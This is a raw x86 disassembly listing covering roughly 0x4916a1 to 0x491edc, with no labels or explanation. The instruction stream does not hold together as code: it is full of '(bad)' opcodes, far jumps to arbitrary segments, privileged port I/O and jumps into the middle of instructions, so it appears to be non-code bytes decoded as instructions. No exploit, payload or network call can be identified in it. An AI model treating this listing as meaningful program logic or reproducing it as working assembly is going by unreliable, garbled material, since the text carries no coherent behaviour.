  4916a1:	xlat   BYTE PTR ds:[ebx]
  4916a2:	test   BYTE PTR [esi+0x70],0x2
  4916a6:	ins    BYTE PTR es:[edi],dx
  4916a7:	jmp    0x3b07:0x5e56b4ea
  4916ae:	add    DWORD PTR [eax],ebx
  4916b0:	(bad)  [esi-0x7d]
  4916b3:	add    eax,0xa3240583
  4916b8:	lods   al,BYTE PTR ds:[esi]
  4916b9:	mov    esi,0xb0a3080e
  4916be:	loop   0x4916e8
  4916c0:	cmp    al,0x5f
  4916c2:	or     al,0xa3
  4916c4:	mov    ah,0x33
  4916c6:	inc    edx
  4916c7:	outs   dx,BYTE PTR ds:[esi]
  4916c8:	ins    DWORD PTR es:[edi],dx
  4916c9:	fsubr  DWORD PTR [ecx+0x52]
  4916cc:	jge    0x4916de
  4916ce:	into   
  4916cf:	dec    esp
  4916d0:	inc    ebx
  4916d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4916d2:	(bad)  
  4916d3:	push   ds
  4916d4:	fucomip st,st(7)
  4916d6:	or     al,0x45
  4916d8:	mov    al,ds:0xe8eb402c
  4916dd:	xor    edi,DWORD PTR ds:0x8a0d7d09
  4916e3:	dec    esp
  4916e4:	sbb    BYTE PTR [eax+ecx*4],bl
  4916e7:	inc    eax
  4916e8:	sbb    ecx,ebp
  4916ea:	or     ch,BYTE PTR [ebp+eax*1+0x31]
  4916ee:	jmp    0x79fbcbf3
  4916f3:	sbb    eax,0x36c31860
  4916f8:	or     BYTE PTR [esi],al
  4916fa:	out    0xff,al
  4916fc:	add    al,0x57
  4916fe:	inc    edi
  4916ff:	jo     0x49176c
  491701:	ins    DWORD PTR es:[edi],dx
  491702:	adc    ebx,DWORD PTR [ebx-0x3e2ab08f]
  491708:	pop    ebp
  491709:	sbb    eax,0xa3d7ea26
  49170e:	fs call 0x3c8d03ff
  491714:	stos   BYTE PTR es:[edi],al
  491715:	xor    BYTE PTR [ebp+0x209825eb],bl
  49171b:	cmp    ebx,0x8853826b
  491721:	enter  0x9553,0xeb
  491725:	add    al,0xa0
  491727:	and    eax,esp
  491729:	popa   
  49172a:	shl    al,cl
  49172c:	add    bh,al
  49172e:	cmp    DWORD PTR ds:0xb7f9d550,0x6a
  491735:	push   0x20fd6a5c
  49173a:	arpl   WORD PTR [edi+0x6105c759],ax
  491740:	pushf  
  491741:	add    eax,0xb47dc4ec
  491746:	mov    eax,0x53382ce9
  49174b:	push   0x58
  49174d:	(bad)  
  49174e:	mov    eax,DWORD PTR [edi+0x11d40f74]
  491754:	xchg   edx,eax
  491755:	(bad)  
  491756:	push   eax
  491757:	sbb    DWORD PTR [eax-0x7f37f36d],edi
  49175d:	mov    ah,0xc0
  49175f:	(bad)  
  491760:	clc    
  491761:	adc    ebp,DWORD PTR [eax-0x37efa078]
  491767:	and    BYTE PTR [ecx+0x7804f87b],al
  49176d:	jmp    0x491791
  49176f:	jo     0x491737
  491771:	loop   0x491776
  491773:	aaa    
  491774:	cmp    DWORD PTR [ebx+0x62],0xffffffd8
  491778:	mov    eax,ds:0xc20a2c92
  49177d:	pop    ds
  49177e:	ret    
  49177f:	popf   
  491780:	jnp    0x491760
  491782:	sub    bh,BYTE PTR [eax+ecx*1]
  491785:	jne    0x491707
  491787:	aam    0x5
  491789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49178a:	sub    ah,BYTE PTR [esi]
  49178c:	or     al,0xc6
  49178e:	add    al,0x8f
  491790:	or     eax,0x3981a705
  491795:	sbb    BYTE PTR [ebx+0x712d7835],al
  49179b:	ins    BYTE PTR es:[edi],dx
  49179c:	imul   eax,DWORD PTR [ebp+ecx*4+0x46],0xffffffe0
  4917a1:	pop    esi
  4917a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4917a3:	pop    ebp
  4917a4:	xchg   BYTE PTR [edx+esi*1+0x37bda7de],bh
  4917ab:	or     ebp,esp
  4917ad:	outs   dx,DWORD PTR ds:[esi]
  4917ae:	cmp    eax,0x68a61088
  4917b3:	es mov al,0xf1
  4917b6:	mov    WORD PTR [edi+edi*2+0x18395e20],?
  4917bd:	jne    0x491819
  4917bf:	sbb    bh,BYTE PTR [eax+0x799a1317]
  4917c5:	in     al,0x4e
  4917c7:	lods   eax,DWORD PTR ds:[esi]
  4917c8:	push   DWORD PTR [esi+0x17ed8e6b]
  4917ce:	inc    eax
  4917cf:	mov    ah,0xe6
  4917d1:	int3   
  4917d2:	pushf  
  4917d3:	inc    edx
  4917d4:	in     al,dx
  4917d5:	scas   al,BYTE PTR es:[edi]
  4917d6:	sbb    BYTE PTR [edi+0x2a467b71],bl
  4917dc:	daa    
  4917dd:	daa    
  4917de:	inc    esp
  4917df:	rol    BYTE PTR [eax+eax*2+0x1a],0xa7
  4917e4:	gs push esi
  4917e6:	dec    edi
  4917e7:	les    ebp,FWORD PTR ds:0xcc208795
  4917ed:	lods   eax,DWORD PTR ds:[esi]
  4917ee:	or     eax,0x2b5f40db
  4917f3:	(bad)  
  4917f4:	and    eax,0xb5c11bd0
  4917f9:	adc    BYTE PTR [eax+ebx*4-0x2e793740],ah
  491800:	or     DWORD PTR [esi+ebp*8],ecx
  491803:	mov    al,0x3d
  491805:	or     BYTE PTR ds:0x2798391b,ch
  49180b:	sbb    ebx,DWORD PTR [ebx+eax*8]
  49180e:	dec    ecx
  49180f:	fucompp 
  491811:	aaa    
  491812:	jmp    0xd17f:0x897e8dd4
  491819:	cmp    DWORD PTR [eax-0x76],ebp
  49181c:	fadd   QWORD PTR [edi]
  49181e:	or     BYTE PTR [ebx],cl
  491820:	imul   eax,ebp,0x36
  491823:	add    BYTE PTR [edi],cl
  491825:	cmp    DWORD PTR [edi-0x4],ebx
  491828:	and    al,0x47
  49182a:	add    al,0x2d
  49182c:	adc    eax,0x83e1f089
  491831:	(bad)  
  491832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491833:	(bad)  
  491834:	jns    0x4917fd
  491836:	inc    edi
  491837:	ret    0x680f
  49183a:	mov    ds:0xfc4bbb3b,eax
  49183f:	adc    dl,al
  491841:	xor    al,0x56
  491843:	pusha  
  491844:	je     0x49186e
  491846:	push   edi
  491847:	mov    DWORD PTR [esp+eax*4+0x76],ebp
  49184b:	pop    ss
  49184c:	les    esp,FWORD PTR [ebp+0x3f]
  49184f:	adc    al,0x1b
  491851:	addr16 gs into 
  491854:	ret    0x4f93
  491857:	sub    BYTE PTR [esi+0x59],dl
  49185a:	or     BYTE PTR [eax+0x9],dh
  49185d:	data16 sbb BYTE PTR ds:0xde04,cl
  491863:	retf   0x2fcf
  491866:	add    edx,DWORD PTR ds:0x1d1795e
  49186c:	lock inc esi
  49186e:	jo     0x491810
  491870:	ret    0xf359
  491873:	je     0x491897
  491875:	cmp    DWORD PTR [esi+0x1c],0x2d
  491879:	jo     0x4918e7
  49187b:	or     edx,DWORD PTR [eax]
  49187d:	push   eax
  49187e:	or     eax,0x11360c19
  491883:	mov    bh,0x20
  491885:	or     BYTE PTR ds:[ebx-0x4d98083a],al
  49188c:	pop    ecx
  49188d:	pusha  
  49188e:	cmc    
  49188f:	jle    0x491901
  491891:	jae    0x4918fb
  491893:	ins    BYTE PTR es:[edi],dx
  491894:	jmp    0x491854
  491896:	pop    ebx
  491897:	push   es
  491898:	dec    ecx
  491899:	ror    bl,0x50
  49189c:	dec    eax
  49189d:	out    0x2c,al
  49189f:	rol    BYTE PTR [ecx+0xcc31bd6],0x6c
  4918a6:	mov    eax,0x5806d3b5
  4918ab:	ins    DWORD PTR es:[edi],dx
  4918ac:	pop    eax
  4918ad:	mov    ds,WORD PTR [eax+0x2c]
  4918b0:	jo     0x491867
  4918b2:	es lock or al,0x9a
  4918b6:	ror    bh,1
  4918b8:	push   esp
  4918b9:	inc    esp
  4918ba:	add    al,0xf6
  4918bc:	les    esp,FWORD PTR [eax]
  4918be:	ds xor eax,0xfb4049b7
  4918c4:	into   
  4918c5:	jne    0x4918e2
  4918c7:	and    bh,BYTE PTR [ebx+ebp*2-0x6aed6bde]
  4918ce:	arpl   WORD PTR [ecx+0x74],ax
  4918d1:	(bad)  
  4918d2:	fbld   TBYTE PTR [ebx+ebx*1+0x52ef0ed2]
  4918d9:	shr    BYTE PTR [ebp+0x7b49708],0x44
  4918e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4918e1:	push   ss
  4918e2:	push   eax
  4918e3:	cmp    ah,al
  4918e5:	and    DWORD PTR [esi+0xdbbb709],0x33
  4918ec:	jmp    DWORD PTR [ecx+0x280e3f58]
  4918f2:	js     0x491924
  4918f4:	cld    
  4918f5:	shl    DWORD PTR [edi+0x2e],0xbb
  4918f9:	jmp    0x8b3b086
  4918fe:	push   0x2d1f7148
  491903:	push   ss
  491904:	lock push 0xc0d72dd0
  49190a:	mov    DWORD PTR [esi+0x5c],0xdf18a224
  491911:	fdivr  DWORD PTR [eax]
  491913:	pop    eax
  491914:	data16 or BYTE PTR [esi-0x396093b9],cl
  49191b:	int    0x2a
  49191d:	add    al,0x70
  49191f:	mov    BYTE PTR [esi+0x4b0c43a6],0x1
  491926:	lods   al,BYTE PTR ds:[esi]
  491927:	add    DWORD PTR [esi-0x13],ebx
  49192a:	inc    edx
  49192b:	push   0x89c37ff9
  491930:	adc    BYTE PTR [ebx],cl
  491932:	sbb    BYTE PTR [edi],cl
  491934:	imul   ebx,edx,0x35b43bb
  49193a:	push   0x1ced303e
  49193f:	call   0xcba1:0xc004468a
  491946:	push   ss
  491947:	bound  ebp,QWORD PTR [esi+ebp*1-0x3b]
  49194b:	mov    ch,0x14
  49194d:	xlat   BYTE PTR ds:[ebx]
  49194e:	arpl   bx,sp
  491950:	sub    ebp,esp
  491952:	ret    0x230
  491955:	or     al,0xe
  491957:	jecxz  0x491946
  491959:	pop    ss
  49195a:	dec    esi
  49195b:	test   BYTE PTR [ebx],dh
  49195d:	ret    
  49195e:	mov    ebp,0xd8205456
  491963:	retf   0xe938
  491966:	push   0xa9d9e0aa
  49196b:	mov    bh,al
  49196d:	xchg   edi,eax
  49196e:	dec    esi
  49196f:	lahf   
  491970:	cmp    dl,BYTE PTR [esi+0x53]
  491973:	mov    eax,ds:0x790c48f8
  491978:	loop   0x491992
  49197a:	jle    0x4919f0
  49197c:	and    cl,bl
  49197e:	adc    eax,0x79e34cc5
  491983:	das    
  491984:	mov    edx,0xeb06fb37
  491989:	or     DWORD PTR [ebx+0x33],edx
  49198c:	not    dl
  49198e:	jl     0x4919fb
  491990:	and    al,0x9e
  491992:	aam    0xc6
  491994:	aaa    
  491995:	bnd jo 0x49192b
  491998:	push   ds
  491999:	mov    DWORD PTR [eax],edx
  49199b:	xor    cl,BYTE PTR [eax+esi*2+0x8d1132a]
  4919a2:	adc    eax,0xa40e24f8
  4919a7:	test   ecx,ebp
  4919a9:	enter  0x1a0b,0x2c
  4919ad:	xor    al,0x40
  4919af:	push   cs
  4919b0:	in     al,0x40
  4919b2:	cmp    al,0x40
  4919b4:	icebp  
  4919b5:	inc    eax
  4919b6:	push   cs
  4919b7:	in     al,0x44
  4919b9:	dec    eax
  4919ba:	pop    esp
  4919bb:	cmp    eax,0x6630881c
  4919c0:	dec    ebp
  4919c1:	and    DWORD PTR [ebx+0x3a60687e],ebx
  4919c7:	icebp  
  4919c8:	mov    ss,WORD PTR gs:[edi-0x75]
  4919cc:	dec    eax
  4919ce:	test   eax,0x575d7e58
  4919d3:	dec    ebx
  4919d4:	imul   ebx,DWORD PTR [ecx+0x2963bcfa],0x5f
  4919db:	jbe    0x491a49
  4919dd:	and    edx,DWORD PTR [edi+0x59]
  4919e0:	das    
  4919e1:	add    bh,BYTE PTR [edi-0x5]
  4919e4:	pop    ecx
  4919e5:	cmp    edi,DWORD PTR ds:0xf27e1433
  4919eb:	imul   eax,DWORD PTR [esi],0x5e
  4919ee:	add    DWORD PTR [edx+eax*8],ecx
  4919f1:	jne    0x49197c
  4919f3:	cmps   WORD PTR ds:[si],WORD PTR es:[di]
  4919f6:	mov    ecx,DWORD PTR ds:0x7f6da503
  4919fc:	pop    ss
  4919fd:	ror    BYTE PTR [edx],0xb7
  491a00:	or     bh,BYTE PTR [ebp+0x17]
  491a03:	sbb    DWORD PTR [ebx-0x17],0xffffff8b
  491a07:	push   ebp
  491a08:	or     eax,0xb4b7425
  491a0d:	daa    
  491a0e:	push   esi
  491a0f:	vpmulhw xmm1,xmm7,XMMWORD PTR [ecx+eiz*2-0x75]
  491a15:	xor    eax,0x6913c6d6
  491a1a:	jmp    0x2fb87ac4
  491a1f:	and    bh,BYTE PTR [eax+ecx*1+0x5e]
  491a23:	hlt    
  491a24:	pop    ss
  491a25:	push   esi
  491a26:	(bad)
  491a29:	cmp    DWORD PTR [edx+0x7f],ebp
  491a2c:	jp     0x491a93
  491a2e:	push   0x47
  491a30:	xlat   BYTE PTR ds:[ebx]
  491a31:	or     DWORD PTR [esi+0x50],ecx
  491a34:	jg     0x491a09
  491a36:	push   edi
  491a37:	(bad)  
  491a38:	push   ds
  491a39:	aam    0x8a
  491a3b:	mov    ch,0x4f
  491a3d:	or     DWORD PTR [ebx+0x3],esp
  491a40:	aas    
  491a41:	in     eax,dx
  491a42:	push   edi
  491a43:	sti    
  491a44:	je     0x491a09
  491a46:	push   esi
  491a47:	loopne 0x491a5d
  491a49:	push   0x7ca92e0c
  491a4e:	mov    bh,0xdb
  491a50:	mov    ebx,0xa30f0068
  491a55:	mov    eax,0x2df418b6
  491a5a:	mov    esp,0x1972c138
  491a5f:	in     al,dx
  491a60:	shl    BYTE PTR [esi+0x43],0x99
  491a64:	leave  
  491a65:	test   eax,0xa3c3581b
  491a6a:	jmp    0xb1604169
  491a6f:	xor    al,0xcd
  491a71:	push   ecx
  491a72:	adc    BYTE PTR ds:0xa76ebcc0,cl
  491a78:	iret   
  491a79:	loopne 0x491a9f
  491a7b:	mov    eax,ds:0xf7a1859d
  491a80:	mov    DWORD PTR ds:0x81deb971,0x417885e8
  491a8a:	test   BYTE PTR [ecx+0x4eb97777],0xc7
  491a91:	and    BYTE PTR [ebx+0x23c17477],0xe7
  491a98:	shl    BYTE PTR [ebx],0x42
  491a9b:	fld    DWORD PTR [ebp+ecx*1+0xf78a806]
  491aa2:	jbe    0x491b0b
  491aa4:	sub    bh,BYTE PTR [esp+ebp*8+0x1c]
  491aa8:	and    eax,DWORD PTR [edi+0x5c]
  491aab:	or     esi,DWORD PTR [edx]
  491aad:	sub    al,0x59
  491aaf:	and    DWORD PTR [ecx+0x11],ebx
  491ab2:	nop    esi
  491ab5:	sbb    BYTE PTR [ecx-0x39],0xf3
  491ab9:	dec    ebp
  491aba:	test   al,0x63
  491abc:	adc    bl,bh
  491abe:	mov    ebp,0x653d8bc3
  491ac3:	push   0xc6417a83
  491ac8:	jne    0x491aa1
  491aca:	aad    0x34
  491acc:	pop    esp
  491acd:	push   cs
  491ace:	adc    al,BYTE PTR [edi+0x3e407b44]
  491ad4:	dec    ebp
  491ad5:	enter  0xd730,0x73
  491ad9:	sbb    esi,DWORD PTR [ecx-0x7b6fca9f]
  491adf:	jmp    0x491ae8
  491ae1:	mov    ecx,0x4f016ee
  491ae6:	mov    dl,0xb1
  491ae8:	enter  0xe4b5,0x45
  491aec:	push   0x5d
  491aee:	outs   dx,DWORD PTR ds:[esi]
  491aef:	sub    BYTE PTR [ebx],al
  491af1:	and    esi,eax
  491af3:	(bad)  
  491af4:	adc    eax,0x896e57fc
  491af9:	or     edx,DWORD PTR [edx+ebx*2]
  491afc:	mov    ah,0xee
  491afe:	adc    eax,0x94e0a574
  491b03:	or     BYTE PTR [ebp+ecx*4+0x67],cl
  491b07:	sub    ebp,DWORD PTR [eax]
  491b09:	fadd   QWORD PTR [ebp+0x1a7310e4]
  491b0f:	sub    eax,0x776cc35e
  491b14:	mov    DWORD PTR [ebp+0x30160ad8],eax
  491b1a:	std    
  491b1b:	pusha  
  491b1c:	test   esp,ebx
  491b1e:	mov    dl,0xb2
  491b20:	repnz std 
  491b22:	sub    eax,esp
  491b24:	std    
  491b25:	or     cl,BYTE PTR [ebp-0x62276a24]
  491b2b:	aam    0xf2
  491b2d:	sti    
  491b2e:	mov    bl,0xb2
  491b30:	mov    ch,0xd0
  491b32:	mov    ebp,0x958c66cc
  491b37:	clc    
  491b38:	or     eax,0xf2f3ec8d
  491b3d:	repnz repnz popf 
  491b40:	enter  0xc485,0xa5
  491b44:	shr    BYTE PTR [ebp-0x3efae844],0xf9
  491b4b:	pushf  
  491b4c:	pop    DWORD PTR [ebp+0x2be6cf0]
  491b52:	les    edi,FWORD PTR [ebx+0x5a]
  491b55:	add    al,0xa8
  491b57:	hlt    
  491b58:	(bad)  
  491b59:	(bad)  
  491b5b:	scas   al,BYTE PTR es:[edi]
  491b5c:	in     eax,dx
  491b5d:	fisubr DWORD PTR [esp+edx*8-0x18]
  491b61:	aaa    
  491b62:	dec    ecx
  491b63:	cld    
  491b64:	xor    ah,ah
  491b66:	adc    DWORD PTR [ebp+0xc],ecx
  491b69:	loopne 0x491af4
  491b6b:	jnp    0x491bdd
  491b6d:	xchg   ebp,eax
  491b6e:	cld    
  491b6f:	adc    BYTE PTR [edx],ah
  491b71:	pop    ss
  491b72:	in     al,dx
  491b73:	or     dh,bh
  491b75:	sbb    dl,al
  491b77:	and    DWORD PTR [ebx+0xf1284e7],edi
  491b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  491b7e:	mov    ds:0x246d8d83,eax
  491b83:	sub    BYTE PTR [ebp+0x10],0x1c
  491b87:	or     al,BYTE PTR [edi+eax*2]
  491b8a:	or     BYTE PTR [ecx+ebp*8],cl
  491b8d:	mov    eax,ds:0x1af158ab
  491b92:	rol    BYTE PTR [esi],cl
  491b94:	mov    esi,0xec05217
  491b99:	mov    BYTE PTR [ebx-0x1bfdbde6],dh
  491b9f:	ins    DWORD PTR es:[edi],dx
  491ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491ba1:	and    DWORD PTR [edi-0x21d6dcdf],0x5ea85ec0
  491bab:	jb     0x491bb0
  491bad:	(bad)  
  491baf:	add    ebx,DWORD PTR [ebp-0x3e]
  491bb2:	cmp    BYTE PTR [eax-0x777e962f],cl
  491bb8:	(bad)  
  491bb9:	into   
  491bba:	mov    DWORD PTR [edx+ecx*4+0x1],eax
  491bbe:	sbb    esp,esi
  491bc0:	and    DWORD PTR [ecx+edx*2-0x6bccd7c8],ecx
  491bc7:	mov    edx,0x4756ffd
  491bcc:	int    0x60
  491bce:	mov    ecx,0xf9834113
  491bd3:	sub    eax,0x488df172
  491bd8:	in     eax,dx
  491bd9:	push   cs
  491bda:	adc    DWORD PTR [edi+0xe],esi
  491bdd:	in     eax,dx
  491bde:	mov    ah,0x93
  491be0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  491be1:	jo     0x491c13
  491be3:	ss adc BYTE PTR fs:0x859eba92,al
  491beb:	inc    esp
  491bec:	hlt    
  491bed:	push   cs
  491bee:	adc    al,cl
  491bf0:	pop    es
  491bf1:	cwde   
  491bf2:	sub    eax,0x241ac120
  491bf8:	adc    eax,0x5af844e
  491bfd:	out    0xb8,al
  491bff:	enter  0xae0b,0x26
  491c03:	inc    ebp
  491c04:	gs and edx,edi
  491c07:	and    eax,0xa2cf0ccc
  491c0c:	jle    0x491c60
  491c0e:	call   0x89ffa286
  491c13:	or     BYTE PTR [edx],ah
  491c15:	and    eax,0xb46df8e5
  491c1a:	adc    eax,0x661bf4e0
  491c1f:	sbb    eax,ecx
  491c21:	cmp    al,0xc7
  491c23:	add    BYTE PTR [eax-0xa34d404],ah
  491c29:	dec    esi
  491c2a:	mov    cs,WORD PTR [eax+0x4]
  491c2d:	mov    BYTE PTR [eax+0x28],0x1
  491c31:	push   0x5d
  491c33:	xchg   ebx,eax
  491c34:	push   ebx
  491c35:	inc    ecx
  491c36:	lea    ebp,[edx-0x58]
  491c39:	xor    BYTE PTR [ecx+0x66],ch
  491c3c:	arpl   WORD PTR [ecx+0x2d740c35],sp
  491c42:	mov    cl,0xad
  491c44:	out    0x15,al
  491c46:	jle    0x491c6d
  491c48:	sub    al,0x8d
  491c4a:	jo     0x491c4d
  491c4c:	pop    eax
  491c4d:	and    eax,0xb6147b7
  491c52:	popf   
  491c53:	and    eax,0xef21327b
  491c58:	inc    edi
  491c59:	ins    BYTE PTR es:[edi],dx
  491c5a:	inc    eax
  491c5b:	and    edx,esp
  491c5d:	outs   dx,BYTE PTR ds:[esi]
  491c5e:	(bad)  
  491c5f:	sub    al,0x52
  491c61:	xchg   BYTE PTR [ebx],dl
  491c63:	icebp  
  491c64:	rol    DWORD PTR [edi],cl
  491c66:	push   eax
  491c67:	inc    edx
  491c68:	mov    eax,0xf60943d4
  491c6d:	aaa    
  491c6e:	xor    al,0x12
  491c70:	mov    al,0xd5
  491c72:	dec    edx
  491c73:	mov    BYTE PTR [esi+0x24],0xd1
  491c77:	not    DWORD PTR [ebp+0x5a]
  491c7a:	mov    eax,0x3e1d9aba
  491c7f:	jo     0x491ca7
  491c81:	pop    ebx
  491c82:	jae    0x491c07
  491c84:	or     edi,0x16cf8b0c
  491c8a:	outs   dx,DWORD PTR ds:[esi]
  491c8b:	out    0xeb,al
  491c8d:	sbb    BYTE PTR [esi+ebx*8-0x46],bh
  491c91:	retf   0xa48b
  491c94:	mov    DWORD PTR [ecx],0x8e43cb65
  491c9a:	or     eax,ebp
  491c9c:	mov    al,es:0x25cc832e
  491ca2:	xchg   edx,eax
  491ca3:	neg    DWORD PTR es:[ebx+0x2]
  491ca7:	jo     0x491c7f
  491ca9:	mov    ?,WORD PTR [ebp+0x63]
  491cac:	inc    esp
  491cad:	dec    ecx
  491cae:	push   ecx
  491caf:	mov    dl,0xc0
  491cb1:	(bad)  
  491cb2:	out    dx,eax
  491cb3:	in     al,dx
  491cb4:	inc    esi
  491cb5:	dec    eax
  491cb6:	ja     0x491cd1
  491cb8:	arpl   WORD PTR [esi+0x4837d0ab],si
  491cbe:	js     0x491cd2
  491cc0:	imul   esi,eax,0x9abe5908
  491cc6:	mov    al,ds:0x78c4bfd6
  491ccb:	lea    edi,[ebp-0x20]
  491cce:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  491cd0:	pushf  
  491cd1:	in     al,dx
  491cd2:	pop    edi
  491cd3:	fst    DWORD PTR [edi+0x5ed29e04]
  491cd9:	inc    esi
  491cda:	test   BYTE PTR [eax],0x8
  491cdd:	jbe    0x491ce4
  491cdf:	dec    edi
  491ce0:	loop   0x491d4d
  491ce2:	sbb    BYTE PTR [eax-0x67],al
  491ce5:	add    DWORD PTR [esi+0x5b87f010],eax
  491ceb:	push   eax
  491cec:	sbb    DWORD PTR [eax+edx*8],ebx
  491cef:	lods   al,BYTE PTR ds:[esi]
  491cf0:	add    BYTE PTR [eax],bl
  491cf2:	pop    edx
  491cf3:	dec    edi
  491cf4:	fs leave 
  491cf6:	jmp    0xfaa8e287
  491cfb:	aam    0xbf
  491cfd:	shl    BYTE PTR [esi],1
  491cff:	cmp    al,0xf5
  491d01:	hlt    
  491d02:	xchg   esp,eax
  491d03:	add    edi,esp
  491d05:	jnp    0x491d3a
  491d07:	push   es
  491d08:	lea    eax,[esi*8+0x388912f0]
  491d0f:	push   0x213c0fa0
  491d14:	cmp    BYTE PTR [ebx-0xc],dh
  491d17:	xor    BYTE PTR [ebx+0x22c818c7],al
  491d1d:	test   eax,0x9b84ac2a
  491d22:	data16 and al,0x7c
  491d25:	sar    DWORD PTR [edi-0x16],cl
  491d28:	and    al,0x2a
  491d2a:	cmp    esp,DWORD PTR [eax+esi*8-0x6d0ed3af]
  491d31:	mov    edx,0xdf724180
  491d36:	sbb    eax,0xbe564820
  491d3b:	daa    
  491d3c:	xchg   esp,eax
  491d3d:	ret    0x268f
  491d40:	out    dx,al
  491d41:	test   al,0x13
  491d43:	cmp    DWORD PTR [esi+0x0],0x57
  491d47:	call   ebx
  491d49:	and    dl,BYTE PTR ds:0xf00d3819
  491d4f:	pop    ecx
  491d50:	aam    0x82
  491d52:	(bad)  
  491d53:	imul   ebx
  491d55:	cmp    esi,0xdc7c2410
  491d5b:	push   ebx
  491d5c:	pop    edi
  491d5d:	call   0xca3803cb
  491d62:	push   ebx
  491d63:	jne    0x491d68
  491d65:	push   eax
  491d66:	aas    
  491d67:	out    0x5e,al
  491d69:	pop    ebx
  491d6a:	pop    eax
  491d6b:	pusha  
  491d6c:	mov    eax,0x34ff798f
  491d71:	lds    ebx,FWORD PTR [ecx+0x73]
  491d74:	mov    eax,ds:0xa9d2621
  491d79:	cwde   
  491d7a:	dec    bp
  491d7c:	sub    eax,0xdb0a1b80
  491d81:	cmp    DWORD PTR ds:0x6a238384,ebx
  491d87:	les    esp,FWORD PTR [ecx+0x31613482]
  491d8d:	xchg   ecx,eax
  491d8e:	jle    0x491d81
  491d90:	cmp    DWORD PTR [esi],ebx
  491d92:	je     0x491d3e
  491d94:	jmp    0x491e03
  491d96:	push   0x18
  491d98:	adc    eax,0x54dc0ff8
  491d9d:	mov    ch,0xf6
  491d9f:	(bad)  
  491da1:	jmp    0x491df3
  491da3:	push   0x7c
  491da5:	fmul   DWORD PTR [esi-0x78]
  491da8:	or     dl,BYTE PTR [edi+0x755efc5d]
  491dae:	sub    edx,DWORD PTR [edi]
  491db0:	push   edi
  491db1:	(bad)  
  491db2:	xor    ah,cl
  491db4:	xor    BYTE PTR [edi],cl
  491db6:	jne    0x491dcf
  491db8:	scas   eax,DWORD PTR es:[edi]
  491db9:	imul   edx,ecx,0xbc926f84
  491dbf:	jmp    0x491dcc
  491dc1:	mov    DWORD PTR [esi],edi
  491dc3:	jmp    0x491daa
  491dc5:	or     DWORD PTR [edi],edx
  491dc7:	inc    esi
  491dc8:	jecxz  0x491e3c
  491dca:	mov    esi,0x918aafd
  491dcf:	pop    edx
  491dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  491dd1:	xor    DWORD PTR [ebp+0x87ab38d],eax
  491dd7:	mov    edi,0x7217ec86
  491ddc:	add    eax,0xec111159
  491de1:	xor    BYTE PTR [esi-0x68c920f0],ah
  491de7:	call   0xf478aa2d
  491dec:	mov    eax,0xc27840f5
  491df1:	pop    edx
  491df2:	bound  ecx,QWORD PTR [edx+edx*1]
  491df5:	sbb    eax,0xd3b3eed0
  491dfa:	push   ss
  491dfb:	ret    0x1428
  491dfe:	out    dx,eax
  491dff:	lock pop esp
  491e01:	jmp    0x1421286e
  491e06:	jecxz  0x491e06
  491e08:	add    BYTE PTR [ecx+0x7b],0xa3
  491e0c:	and    BYTE PTR [eax+0x8],ch
  491e0f:	pop    ecx
  491e10:	cmp    dl,BYTE PTR [ebp+0x1a243bee]
  491e16:	mov    ds:0x302c0928,eax
  491e1b:	loopne 0x491da8
  491e1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491e1e:	xor    BYTE PTR [edi-0x61c68bf3],0x39
  491e25:	push   eax
  491e26:	add    al,0x25
  491e28:	xor    al,0xa
  491e2b:	dec    edx
  491e2c:	icebp  
  491e2d:	imul   esi,esi,0xc
  491e30:	xchg   esp,eax
  491e31:	xchg   ebp,eax
  491e32:	pop    ebp
  491e33:	ins    BYTE PTR es:[edi],dx
  491e34:	popa   
  491e35:	ror    BYTE PTR [esi-0x14],1
  491e38:	imul   ecx,ecx,0x18
  491e3b:	mov    BYTE PTR [eax],al
  491e3d:	pop    es
  491e3e:	aam    0x7d
  491e40:	pop    esi
  491e41:	cmp    eax,ecx
  491e43:	jae    0x491e4a
  491e45:	cmp    al,0xc9
  491e47:	jle    0x491e5c
  491e49:	or     BYTE PTR [edx+0x1e682c3e],dh
  491e4f:	fcom   st(1)
  491e51:	addr16 jmp 0xd8c4b077
  491e57:	dec    ebx
  491e58:	xor    esp,DWORD PTR [esp+edx*1]
  491e5b:	jno    0x491e68
  491e5d:	jg     0x491eaa
  491e5f:	ss cld 
  491e61:	cmp    ebp,DWORD PTR [edi-0x55a6bfae]
  491e67:	and    al,BYTE PTR [esi]
  491e69:	or     BYTE PTR [esi],dl
  491e6b:	pminsw mm7,QWORD PTR [esi]
  491e6e:	loop   0x491ee5
  491e70:	inc    ebx
  491e71:	loope  0x491e6b
  491e73:	push   eax
  491e74:	mov    dh,0xd7
  491e76:	mov    al,ds:0x2ae51a1d
  491e7b:	mov    esi,0x4109a145
  491e80:	mov    eax,0x55eb7f7e
  491e85:	push   DWORD PTR [edi+0x5c]
  491e88:	mov    edx,ebx
  491e8a:	dec    esp
  491e8b:	jae    0x491eef
  491e8d:	pop    ecx
  491e8e:	adc    BYTE PTR [ebp+0x228b6f88],ch
  491e94:	jmp    0x491ee7
  491e96:	nop
  491e97:	sub    eax,0xf
  491e9a:	je     0x491ece
  491e9c:	idiv   ch
  491e9e:	mov    ds:0x74a21602,al
  491ea3:	adc    bh,BYTE PTR [edi+0x2cbeb9eb]
  491ea9:	jb     0x491e50
  491eab:	mov    ebx,0x162c7dd2
  491eb0:	mov    esi,0xa281728
  491eb5:	mov    esi,0x45623c30
  491eba:	popf   
  491ebb:	or     ah,bh
  491ebd:	or     dl,BYTE PTR [eax-0x62]
  491ec0:	sub    eax,0xe2711297
  491ec5:	lods   al,BYTE PTR ds:[esi]
  491ec6:	loopne 0x491e8a
  491ec8:	fld    TBYTE PTR [ebx]
  491eca:	and    al,0x96
  491ecc:	(bad)  
  491ecd:	sub    bh,BYTE PTR [ecx]
  491ecf:	sbb    al,0x75
  491ed1:	pop    es
  491ed2:	push   0x3
  491ed4:	push   ds
  491ed5:	(bad)
  491ed9:	push   ss
  491eda:	in     al,0xf7
  491edc:	sub    BYTE PTR [esi+0x23],al
